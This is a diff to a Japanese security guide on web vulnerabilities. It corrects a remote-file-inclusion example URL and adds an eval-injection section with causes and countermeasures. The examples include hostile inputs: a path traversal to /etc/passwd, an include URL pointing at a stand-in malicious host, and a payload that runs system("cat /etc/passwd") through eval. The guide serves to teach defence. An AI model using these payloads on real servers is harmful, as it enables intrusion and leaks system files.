@@ -306,7 +306,7 @@ http://example.com/page.php?file=../../../../etc/passwd
 リモートファイルインクルードの場合は、攻撃者が外部サーバに用意した悪意のあるスクリプトをクエリパラメータ`file`に指定し、それがinclude対象のファイルとして動的に設定される場合、そのスクリプトがサーバ上で実行されることで、サイトの改ざんや、不正な機能の実行が可能になる。
 
 ```
-http://example.com/page.php?file=http://www.trap.com/malicous
+http://example.com/page.php?file=http://www.trap.com/malicious
 ```
 
 ### 原因
@@ -319,6 +319,34 @@ http://example.com/page.php?file=http://www.trap.com/malicous
 - ファイル名にディレクトリ名が含まれないようにする
 - ファイル名を英数字のみに限定する（ヌルバイトなどの制限文字を許可しない）
 
+# 構造化データの読み込みに関する脆弱性
+## evalインジェクション
+### 概要
+プログラミング言語の中には、文字列で与えられた引数をコードとして解釈・実行する`eval`関数およびそれに相当する機能を提供しているものがある。その関数に、外部からのパラメータを直接渡している場合、スクリプトを注入できる脆弱性が存在する。
+
+例えば、攻撃者が以下のURLを入力した場合を考える。
+
+```
+http://example.com/page.php?data=system("cat /etc/passwd");
+```
+クエリパラメータ`data`の値を、Formデータのデシリアライズの目的で、`eval`関数の引数に直接渡す実装が存在する場合、
+
+```php
+eval('system("cat /etc/passwd");')
+```
+文字列`'system("cat /etc/passwd")'`がソースコードとして解釈・実行される。
+
+今回のケースは、`cat /etc/passwd`の実行により、サーバ内の秘密情報が漏洩する例だが、その他にもサイトの改ざんや、不正機能の実行など、[OSコマンド・インジェクション攻撃](#osコマンドインジェクション)と同様の被害が発生する。
+
+### 原因
+- evalの使用自体が危険
+
+    → [MDN Web Docs](https://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Global_Objects/eval)でも`eval()`を使わないように言及されている
+- evalに与えるパラメータのチェックをしていない
+
+### 対策
+- evalを使用しない
+- eval関数の引数に外部からのパラメータを渡さない。渡す場合は、外部からのパラメータを英数字のみに制限する
 
 
 
